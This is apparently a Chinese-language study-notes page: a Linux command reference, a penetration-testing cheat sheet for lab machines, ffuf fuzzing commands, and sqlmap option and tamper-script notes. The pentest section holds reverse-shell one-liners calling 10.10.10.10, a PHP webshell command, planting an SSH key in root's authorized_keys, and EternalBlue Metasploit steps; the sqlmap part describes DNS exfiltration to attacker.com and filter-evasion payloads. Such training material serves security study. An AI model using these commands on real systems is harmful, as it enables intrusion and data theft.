<td>对 STDOUT 或文件的内容进行排序。</td>
</tr>
<tr>
<td><code>grep</code></td>
<td>搜索包含给定模式的特定结果。</td>
</tr>
<tr>
<td><code>cut</code></td>
<td>从文件的每一行中删除节。</td>
</tr>
<tr>
<td><code>tr</code></td>
<td>替换某些字符。</td>
</tr>
<tr>
<td><code>column</code></td>
<td>基于命令行的实用工具，用于将其输入格式化为多个列。</td>
</tr>
<tr>
<td><code>awk</code></td>
<td>模式扫描和处理语言。</td>
</tr>
<tr>
<td><code>sed</code></td>
<td>用于筛选和转换文本的流编辑器。</td>
</tr>
<tr>
<td><code>wc</code></td>
<td>打印给定输入的换行符、单词和字节计数。</td>
</tr>
<tr>
<td><code>chmod</code></td>
<td>更改文件或目录的权限。</td>
</tr>
<tr>
<td><code>chown</code></td>
<td>更改文件或目录的所有者和组。</td>
</tr>
</tbody></table>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><table>
<thead>
<tr>
<th><code>sudo</code></th>
<th>以其他用户身份执行命令。</th>
</tr>
</thead>
<tbody><tr>
<td><code>su</code></td>
<td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td>
</tr>
<tr>
<td><code>useradd</code></td>
<td>创建新用户或更新默认新用户信息。</td>
</tr>
<tr>
<td><code>userdel</code></td>
<td>删除用户帐户和相关文件。</td>
</tr>
<tr>
<td><code>usermod</code></td>
<td>修改用户帐户。</td>
</tr>
<tr>
<td><code>addgroup</code></td>
<td>将组添加到系统。</td>
</tr>
<tr>
<td><code>delgroup</code></td>
<td>从系统中删除组。</td>
</tr>
<tr>
<td><code>passwd</code></td>
<td>更改用户密码。</td>
</tr>
</tbody></table>
<p>###包管理</p>
<table>
<thead>
<tr>
<th><code>dpkg</code></th>
<th>这是一个安装、构建、删除和管理 Debian 软件包的工具。主要和更用户友好的前端是能力。<code>dpkg``dpkg</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>apt</code></td>
<td>Apt 为包管理系统提供了一个高级命令行界面。</td>
</tr>
<tr>
<td><code>aptitude</code></td>
<td>Aptitude 是 apt 的替代方法，是包管理器的高级接口。</td>
</tr>
<tr>
<td><code>snap</code></td>
<td>安装、配置、刷新和删除快照包。Snaps 支持安全分发适用于云、服务器、桌面和物联网的最新应用程序和实用程序。</td>
</tr>
<tr>
<td><code>gem</code></td>
<td>Gem 是 RubyGems 的前端，Ruby 的标准包管理器。</td>
</tr>
<tr>
<td><code>pip</code></td>
<td>Pip 是一个 Python 软件包安装程序，推荐用于安装 Debian 存档中不可用的 Python 软件包。它可以与版本控制存储库（目前只有 Git、Mercurial 和 Bazaar 存储库）一起使用，广泛记录输出，并通过在开始安装之前下载所有要求来防止部分安装。</td>
</tr>
<tr>
<td><code>git</code></td>
<td>Git 是一个快速、可扩展的分布式版本控制系统，具有异常丰富的命令集，既提供高级操作，又提供对内部内容的完全访问。</td>
</tr>
</tbody></table>
<h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>常规</strong></td>
<td></td>
</tr>
<tr>
<td><code>sudo openvpn user.ovpn</code></td>
<td>连接到虚拟专用网络</td>
</tr>
<tr>
<td><code>ifconfig</code>&#x2F;<code>ip a</code></td>
<td>显示我们的 IP 地址</td>
</tr>
<tr>
<td><code>netstat -rn</code></td>
<td>显示可通过 VPN 访问的网络</td>
</tr>
<tr>
<td><code>ssh user@10.10.10.10</code></td>
<td>通过 SSH 连接到远程服务器</td>
</tr>
<tr>
<td><code>ftp 10.129.42.253</code></td>
<td>FTP 到远程服务器</td>
</tr>
<tr>
<td><strong>鞘鞘</strong></td>
<td></td>
</tr>
<tr>
<td><code>tmux</code></td>
<td>启动 tmux</td>
</tr>
<tr>
<td><code>ctrl+b</code></td>
<td>TMUX：默认前缀</td>
</tr>
<tr>
<td><code>prefix c</code></td>
<td>TMUX：新窗口</td>
</tr>
<tr>
<td><code>prefix 1</code></td>
<td>TMUX：切换到窗口 （<code>1</code>)</td>
</tr>
<tr>
<td><code>prefix shift+%</code></td>
<td>TMUX：垂直拆分窗格</td>
</tr>
<tr>
<td><code>prefix shift+&quot;</code></td>
<td>TMUX：水平拆分窗格</td>
</tr>
<tr>
<td><code>prefix -&gt;</code></td>
<td>TMUX：切换到右窗格</td>
</tr>
<tr>
<td><strong>维姆</strong></td>
<td></td>
</tr>
<tr>
<td><code>vim file</code></td>
<td>VIM：使用 VIM 打开<code>file</code></td>
</tr>
<tr>
<td><code>esc+i</code></td>
<td>VIM：进入模式<code>insert</code></td>
</tr>
<tr>
<td><code>esc</code></td>
<td>VIM：返回模式<code>normal</code></td>
</tr>
<tr>
<td><code>x</code></td>
<td>vim：剪切字符</td>
</tr>
<tr>
<td><code>dw</code></td>
<td>vim：剪切词</td>
</tr>
<tr>
<td><code>dd</code></td>
<td>vim：切割整条线</td>
</tr>
<tr>
<td><code>yw</code></td>
<td>vim：复制单词</td>
</tr>
<tr>
<td><code>yy</code></td>
<td>vim：复制整行</td>
</tr>
<tr>
<td><code>p</code></td>
<td>vim：粘贴</td>
</tr>
<tr>
<td><code>:1</code></td>
<td>vim：转到第 1 行。</td>
</tr>
<tr>
<td><code>:w</code></td>
<td>vim：写入文件“即保存”</td>
</tr>
<tr>
<td><code>:q</code></td>
<td>vim：退出</td>
</tr>
<tr>
<td><code>:q!</code></td>
<td>vim：退出而不保存</td>
</tr>
<tr>
<td><code>:wq</code></td>
<td>vim：写和退出</td>
</tr>
</tbody></table>
<!-- more -->

<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>服务扫描</strong></td>
<td></td>
</tr>
<tr>
<td><code>nmap 10.129.42.253</code></td>
<td>在 IP 上运行 nmap</td>
</tr>
<tr>
<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
<td>在 IP 上运行 nmap 脚本扫描</td>
</tr>
<tr>
<td><code>locate scripts/citrix</code></td>
<td>列出各种可用的 nmap 脚本</td>
</tr>
<tr>
<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
<td>在 IP 上运行 nmap 脚本</td>
</tr>
<tr>
<td><code>netcat 10.10.10.10 22</code></td>
<td>抓取开放端口的横幅</td>
</tr>
<tr>
<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
<td>列出中小企业共享</td>
</tr>
<tr>
<td><code>smbclient \\\\10.129.42.253\\users</code></td>
<td>连接到 SMB 共享</td>
</tr>
<tr>
<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
<td>扫描 IP 上的 SNMP</td>
</tr>
<tr>
<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
<td>暴力破解 SNMP 机密字符串</td>
</tr>
<tr>
<td><strong>网络枚举</strong></td>
<td></td>
</tr>
<tr>
<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
<td>在网站上运行目录扫描</td>
</tr>
<tr>
<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
<td>在网站上运行子域扫描</td>
</tr>
<tr>
<td><code>curl -IL https://www.inlanefreight.com</code></td>
<td>抓取网站横幅</td>
</tr>
<tr>
<td><code>whatweb 10.10.10.121</code></td>
<td>列出有关 Web 服务器&#x2F;证书的详细信息</td>
</tr>
<tr>
<td><code>curl 10.10.10.121/robots.txt</code></td>
<td>列出潜在目录<code>robots.txt</code></td>
</tr>
<tr>
<td><code>ctrl+U</code></td>
<td>查看页面源代码（在火狐中）</td>
</tr>
<tr>
<td><strong>公共漏洞利用</strong></td>
<td></td>
</tr>
<tr>
<td><code>searchsploit openssh 7.2</code></td>
<td>搜索 Web 应用程序的公共漏洞</td>
</tr>
<tr>
<td><code>msfconsole</code></td>
<td>MSF：启动 Metasploit 框架</td>
</tr>
<tr>
<td><code>search exploit eternalblue</code></td>
<td>MSF：在 MSF 中搜索公共漏洞</td>
</tr>
<tr>
<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
<td>MSF：开始使用 MSF 模块</td>
</tr>
<tr>
<td><code>show options</code></td>
<td>MSF：显示 MSF 模块所需的选项</td>
</tr>
<tr>
<td><code>set RHOSTS 10.10.10.40</code></td>
<td>MSF：设置 MSF 模块选项的值</td>
</tr>
<tr>
<td><code>check</code></td>
<td>MSF：测试目标服务器是否易受攻击</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>MSF：在目标服务器上运行漏洞易受攻击</td>
</tr>
<tr>
<td><strong>使用外壳</strong></td>
<td></td>
</tr>
<tr>
<td><code>nc -lvnp 1234</code></td>
<td>在本地端口上启动侦听器<code>nc</code></td>
</tr>
<tr>
<td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td>
<td>从远程服务器发送反向外壳</td>
</tr>
<tr>
<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
<td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td>
</tr>
<tr>
<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
<td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td>
</tr>
<tr>
<td><code>nc 10.10.10.1 1234</code></td>
<td>连接到远程服务器上启动的绑定外壳</td>
</tr>
<tr>
<td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td>
<td>升级外壳 TTY （1）</td>
</tr>
<tr>
<td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td>
<td>升级外壳 TTY （2）</td>
</tr>
<tr>
<td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td>
<td>创建一个 webshell php 文件</td>
</tr>
<tr>
<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
<td>在上传的 Web 外壳上执行命令</td>
</tr>
<tr>
<td><strong>权限提升</strong></td>
<td></td>
</tr>
<tr>
<td><code>./linpeas.sh</code></td>
<td>运行脚本以枚举远程服务器<code>linpeas</code></td>
</tr>
<tr>
<td><code>sudo -l</code></td>
<td>列出可用权限<code>sudo</code></td>
</tr>
<tr>
<td><code>sudo -u user /bin/echo Hello World!</code></td>
<td>运行命令<code>sudo</code></td>
</tr>
<tr>
<td><code>sudo su -</code></td>
<td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td>
</tr>
<tr>
<td><code>sudo su user -</code></td>
<td>切换到用户（如果我们有权访问<code>sudo su</code>)</td>
</tr>
<tr>
<td><code>ssh-keygen -f key</code></td>
<td>创建新的 SSH 密钥</td>
</tr>
<tr>
<td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td>
<td>将生成的公钥添加到用户</td>
</tr>
<tr>
<td><code>ssh root@10.10.10.10 -i key</code></td>
<td>使用生成的私钥通过 SSH 连接到服务器</td>
</tr>
<tr>
<td><strong>传输文件</strong></td>
<td></td>
</tr>
<tr>
<td><code>python3 -m http.server 8000</code></td>
<td>启动本地网络服务器</td>
</tr>
<tr>
<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
<td>从我们的本地计算机下载远程服务器上的文件</td>
</tr>
<tr>
<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
<td>从我们的本地计算机下载远程服务器上的文件</td>
</tr>
<tr>
<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
<td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td>
</tr>
<tr>
<td><code>base64 shell -w 0</code></td>
<td>将文件转换为<code>base64</code></td>
</tr>
<tr>
<td>&#96;echo f0VMR…SNIO…InmDwU</td>
<td>base64 -d &gt; shell&#96;</td>
</tr>
<tr>
<td><code>md5sum shell</code></td>
<td>检查文件以确保其转换正确<code>md5sum</code></td>
</tr>
</tbody></table>
<h3 id="备忘录-1"><a href="#备忘录-1" class="headerlink" title="备忘录"></a>备忘录</h3><h4 id="Ffuf"><a href="#Ffuf" class="headerlink" title="Ffuf"></a>Ffuf</h4><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ffuf -h</code></td>
<td>ffuf help</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></td>
<td>Directory Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code></td>
<td>Extension Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></td>
<td>Page Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></td>
<td>Recursive Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code></td>
<td>Sub-domain Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H &#39;Host: FUZZ.academy.htb&#39; -fs xxx</code></td>
<td>VHost Fuzzing</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></td>
<td>Parameter Fuzzing - GET</td>
</tr>
<tr>
<td><code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td>
<td>Parameter Fuzzing - POST</td>
</tr>
<tr>
<td><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></td>
<td>Value Fuzzing</td>
</tr>
</tbody></table>
<h4 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h4><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code></td>
<td>Directory&#x2F;Page Wordlist</td>
</tr>
<tr>
<td><code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code></td>
<td>Extensions Wordlist</td>
</tr>
<tr>
<td><code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
<td>Domain Wordlist</td>
</tr>
<tr>
<td><code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code></td>
<td>Parameters Wordlist</td>
</tr>
</tbody></table>
<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>sudo sh -c &#39;echo &quot;SERVER_IP academy.htb&quot; &gt;&gt; /etc/hosts&#39;</code></td>
<td>Add DNS entry</td>
</tr>
<tr>
<td><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code></td>
<td>Create Sequence Wordlist</td>
</tr>
<tr>
<td><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;</code></td>
<td>curl w&#x2F; POST</td>
</tr>
</tbody></table>
<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/122222636">SQLMAP深入分析-使用篇（基础使用、进阶命令、tamper脚本）_sqlmap tamper-CSDN博客</a></p>
<p>-v  <em>默认为1</em></p>
<blockquote>
<ul>
<li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息</li>
<li><strong>1</strong>：增加输出普通信息和警告信息</li>
<li><strong>2</strong>：增加输出调试信息</li>
<li><strong>3</strong>：增加输出已注入的 payloads</li>
<li><strong>4</strong>：增加输出 HTTP 请求</li>
<li><strong>5</strong>：增加输出 HTTP 响应头</li>
<li><strong>6</strong>：增加输出 HTTP 响应内容</li>
</ul>
</blockquote>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>-d	#直连数据库，”mysql:&#x2F;&#x2F;root:<a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#56;">&#x72;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#56;</a>:3306&#x2F;testdb”</p>
<p>-u URL</p>
<p>-l	#从Burp代理日志文件中解析目标地址</p>
<p>-m	#从文本文件中批量获取目标</p>
<p>-r	#从文件中读取 HTTP 请求</p>
<p>-g	#使用 Google dork 结果作为目标地址 python sqlmap.py -g “inurl:&quot;.php?id&#x3D;1&quot;“</p>
<p>-c	#从 INI 配置文件中读取选项</p>
<p>–purge			#清除历史缓存</p>
<p>–flush-session	#清除上次扫描的缓存</p>
<h4 id="指定连接时信息"><a href="#指定连接时信息" class="headerlink" title="指定连接时信息"></a>指定连接时信息</h4><p>–method&#x3D;METHOD		#强制使用提供的 HTTP 方法（例如：PUT）</p>
<p>–data&#x3D;DATA			#使用 POST 发送数据串；</p>
<p>–data&#x3D;”id&#x3D;1&amp;user&#x3D;admin”</p>
<p>–param-del&#x3D;”;”		#使用参数分隔符，–data&#x3D;”id&#x3D;1;user&#x3D;admin”</p>
<p>–cookie&#x3D;COOKIE		#指定 HTTP Cookie ，–cookie “id&#x3D;11” –level 2</p>
<p>–drop-set-cookie	#忽略 HTTP 响应中的 Set-Cookie 参数</p>
<p>–user-agent&#x3D;AGENT	#指定 HTTP User-Agent</p>
<p>–random-agent		#使用随机的 HTTP User-Agent，随机从 .&#x2F;txt&#x2F;user-agents.txt 选一个，不是每次请求换一个</p>
<p>–host				#手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析</p>
<p>–referer&#x3D;REFERER	#指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头</p>
<p>-H HEADER			#设置额外的 HTTP 头参数（例如：”X-Forwarded-For: 127.0.0.1”）</p>
<p>–headers&#x3D;HEADERS	#设置额外的 HTTP 头参数,必须以换行符分隔（例如：”Accept-Language: fr\nETag: 123”）</p>
<p>&#x3D;&#x3D;–auth-type，–auth-cred&#x3D;&#x3D;</p>
<blockquote>
<p>#选项用于指定后端 Web 服务器实现的 HTTP 协议认证和所有向目标程序发起 HTTP 请求的有效凭据，支持的三种 HTTP 协议认证机制是：Basic、Digest、NTLM，认证凭据的语法是 username:password。一个符合语法的例子：$ python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id%5C=1">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\=1</a>“ –auth-type Basic –auth-cred “testuser:testpass”</p>
</blockquote>
<p>–auth-file			#HTTP 协议私钥认证</p>
<p>–ignore-code		#忽略（有问题的）HTTP 错误码</p>
<p>–proxy，–proxy-cred，–proxy-file 和 –ignore-proxy	#HTTP(S) 代理，–proxy 并提供 HTTP(S) 代理地址使 HTTP(S) 请求经过该代理到达目标 URL。设置 HTTP(S) 代理的语法是 <a href="http://url:port。如果">http://url:port。如果</a> HTTP(S) 代理需要身份验证，则可以对选项 –proxy-cred 使用 username:password 格式添加对应的凭证可以使用选项 –proxy-file 并指定包含批量代理的文件，想要使用 sqlmap 对本地局域网目标进行测试时应该使用开关 –ignore-proxy 来绕过系统级的 HTTP(S) 代理服务</p>
<p>–delay&#x3D;10			#设置每个 HTTP 请求的延迟秒数</p>
<p>–safe-freq&#x3D;SAFE	 #每访问两次给定的合法 URL 才发送一次测试请求</p>
<p>–csrf-token 和 –csrf-url	#绕过反 CSRF 防护</p>
<p>–force-ssl			#支持https的SQL注入只需加入参数-force-ssl告诉sqlmap这是http服务即可</p>
<p>–identify-waf		#检测是否有WAF&#x2F;IPS&#x2F;IDS，这个功能以失效</p>
<p>–eval				#在每个请求期间运行自定义的 Python 代码</p>
<h4 id="指定注入参数"><a href="#指定注入参数" class="headerlink" title="指定注入参数"></a>指定注入参数</h4><p>-p TESTPARAMETER	#指定需要测试的参数</p>
<p>–skip&#x3D;SKIP			#指定要跳过的参数</p>
<p>–dbms&#x3D;DBMS			#指定 DBMS 类型（例如：MySQL）</p>
<p>–os&#x3D;OS				#指定 DBMS 服务器的操作系统类型</p>
<p>–prefix&#x3D;PREFIX		 #注入 payload 的前缀字符串</p>
<p>–suffix&#x3D;SUFFIX		 #注入 payload 的后缀字符串</p>
<p>–tamper&#x3D;TAMPER		 #用给定脚本修改注入数据</p>
<p>–batch				# 自动跳过选择项，按默认选项注入</p>
<h4 id="指定检测级别"><a href="#指定检测级别" class="headerlink" title="指定检测级别"></a>指定检测级别</h4><p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p>
<p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p>
<p>你可以选择自己修改指定的 payload 用于检测。</p>
<p><strong>level有5级，越高检测越全，默认为 1</strong></p>
<blockquote>
<p>–level 1 检测Get和Post</p>
<p>–level 2 检测HTTP Cookie</p>
<p>–level 3 检测User-Agent和Referer</p>
<p>–level 4 检测</p>
<p>–level 5 检测 HOST 头</p>
</blockquote>
<p><strong>risk有3级，级别越高风险越大，默认为1</strong></p>
<blockquote>
<p>–risk 2 会在默认的检测上添加大量时间型盲注语句测试</p>
<p>–risk 3 会在原基础上添加<code>OR</code> 类型的布尔型盲注 ，可能会update导致修改数据库</p>
</blockquote>
<p><strong>页面对比</strong></p>
<p>选项：–string，–not-string，–regexp 和 –code</p>
<p>默认区分一个 True 查询和 False 查询（布尔型盲注背后的相关理念概念）是通过对比注入前后返回的结果页面是否一致进行判断的</p>
<p>不过这个参照方法并不一定有效，因为可能就算没有进行注入，页面内容也会进行相应更新。例如：页面上有计数器、动态的广告横幅、或者任何基于时间而非用户输入内容进行动态渲染的内容。为了避免类似的情况，sqlmap 会尽可能尝试识别出对应的代码段所返回的请求内容并做好相关的处理</p>
<p>如果用户知道可以通过 HTTP 状态码区分 True 查询和 False 查询（例如：200 对应 True，401 对应 False），那么可以向 sqlmap 提供对应的信息。（例如：–code&#x3D;200）</p>
<p>开关：–text-only 和 –titles</p>
<p>如果用户知道可以通过 HTML 标题区分 True 查询和 False 查询（例如：Welcome 对应 True，Forbidden 对应 False），那么可以使用 –titles 开启基于标题对比的开关</p>
<p>如果 HTTP 响应报文中存在无效信息（例如：脚本、嵌套元素等），可以通过过滤页面的内容（开关 –text-only）而只获取文本内容。通过这种方式，大多数情况下，这样会自动调优检测引擎</p>
<h4 id="指定注入类型"><a href="#指定注入类型" class="headerlink" title="指定注入类型"></a>指定注入类型</h4><p>–technique&#x3D;TECH	#使用的 SQL 注入技术（默认为“BEUSTQ”)<br>B: Boolean-based blind SQL injection（布尔型盲注）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（联合查询注入）<br>S: Stacked queries SQL injection（堆查询注入）<br>T: Time-based blind SQL injection（时间型盲注）<br>Q: inline Query injection（内联查询注入）</p>
<h1 id="例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供-ES"><a href="#例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供-ES" class="headerlink" title="例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES"></a>例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES</h1><p>–time-sec&#x3D;TIMESEC  #设置延时注入的时间（默认为 5）</p>
<p>–second-order&#x3D;S..  #设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</p>
<p>–dns-domain		</p>
<blockquote>
<p>#DNS 渗出攻击# 如果用户正控制着一台注册为 DNS 域名服务器的主机（例如：域名 attacker.com），则可以使用该选项（例如：–dns-domain attacker.com）来启用此攻击。它的前提条件是使用 Administrator（即管理员）权限（因为需要使用特权端口 53）运行 sqlmap，这时可以使用常用的（盲注）技术来进行攻击。如果已经识别出一种有效攻击方式（最好是时间型盲注），则这种攻击能够加速获取数据的过程。如果报错型注入或联合查询注入技术可用，则默认情况下将跳过 DNS 渗出攻击测试</p>
</blockquote>
<h4 id="枚举信息"><a href="#枚举信息" class="headerlink" title="枚举信息"></a>枚举信息</h4><blockquote>
<p>-a, –all          #获取所有信息、数据<br>-f, –fingerprint	#采用特定 SQL 方言或者内带特定错误信息等技术展开详细的 DBMS 指纹识别<br>-b, –banner        #获取 DBMS banner,返回数据库的版本号<br>–current-user			#获取 DBMS 当前用户<br>–current-db			#获取 DBMS 当前数据库<br>–hostname				#获取 DBMS 服务器的主机名<br>–is-dba				#探测 DBMS 当前用户是否为 DBA（数据库管理员）<br>–users					#枚举出 DBMS 所有用户<br>–passwords				#枚举出 DBMS 所有用户的密码哈希<br>–privileges			#枚举出 DBMS 所有用户特权级<br>–roles					#枚举出 DBMS 所有用户角色</p>
<p>–dbs					#枚举出 DBMS 所有数据库<br>–tables				#枚举出 DBMS 数据库中的所有表，–exclude-sysdbs 以排除所有的系统数据库，对于 Oracle，你需要提供 TABLESPACE_NAME 而不是数据库名称<br>–columns				#枚举出 DBMS 表中的所有列，对于 PostgreSQL，你需要提供 public 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 public 为别名<br>–schema				#枚举出 DBMS 所有模式<br>–count					#获取数据表数目<br>–dump-all				#如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目<br>–dump					#导出 DBMS 数据库表项<br>–search，-C，-T，-D		#此开关允许你在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名<br>–stop 10				#只取前10行数据</p>
<p>-D DB					#指定要枚举的 DBMS 数据库<br>-T TBL					#指定要枚举的 DBMS 数据表<br>-C COL					#指定要枚举的 DBMS 数据列</p>
<p>–sql-query&#x3D;QUERY		#指定要执行的 SQL 语句<br>–sql-shell				#调出交互式 SQL shell</p>
</blockquote>
<h4 id="自带tamper介绍"><a href="#自带tamper介绍" class="headerlink" title="自带tamper介绍"></a>自带tamper介绍</h4><blockquote>
<p>apostrophemask.py<br>功能：对引号进行 utf-8 格式编码 (% EF% BC%87)<br>平台：All<br>举例：1 AND ‘1’&#x3D;’1 &#x3D;&#x3D;&gt; 1 AND % EF% BC%871% EF% BC%87&#x3D;% EF% BC%871</p>
<p>apostrophenullencode.py<br>功能：用非法的双 unicode 字符 (%00%27) 替换引号字符<br>平台：All<br>举例：1 AND ‘1’&#x3D;’1 &#x3D;&#x3D;&gt; 1 AND %00%271%00%27&#x3D;%00%271</p>
<p>appendnullbyte.py<br>功能：在有效载荷结束位置加载零字节字符编码<br>平台：Microsoft Access<br>举例：1 AND 1&#x3D;1 &#x3D;&#x3D;&gt; 1 AND 1&#x3D;1%00</p>
<p>base64encode.py<br>功能：用 base64 格式进行编码<br>平台：All<br>举例：1’ AND SLEEP (5)# &#x3D;&#x3D;&gt; MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>
<p>between.py<br>功能：用 between 替换大于号（&gt;）<br>平台：Mssql2005、MySQL 4&#x2F;5.0&#x2F;5.5、Oracle 10g、PostgreSQL 8.3&#x2F;8.4&#x2F;9.0<br>举例：<br>1 AND A &gt; B –  &#x3D;&#x3D;&gt; 1 AND A NOT BETWEEN 0 AND B  –<br>1 AND A &#x3D; B –  &#x3D;&#x3D;&gt; 1 AND A BETWEEN B AND B –</p>
<p>bluecoat.py<br>功能：对 SQL 语句替换空格字符为 (%09)，并替换”&#x3D;”—&gt;”LIKE”<br>平台：MySQL 5.1, SGOS<br>举例：SELECT username FROM users WHERE id &#x3D; 1 &#x3D;&#x3D;&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1</p>
<p>apostrophemask.py<br>功能：用 utf-8 格式编码引号 (如：% EF% BC%87)<br>平台：All<br>举例：1 AND ‘1’&#x3D;’1 &#x3D;&#x3D;&gt; 1 AND % EF% BC%871% EF% BC%87&#x3D;% EF% BC%871</p>
<p>charunicodeencode.py<br>功能：对字符串进行 Unicode 格式转义编码<br>平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP&#x2F;ASP.NET<br>举例：SELECT FIELD%20FROM TABLE &#x3D;&#x3D;&gt; % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045</p>
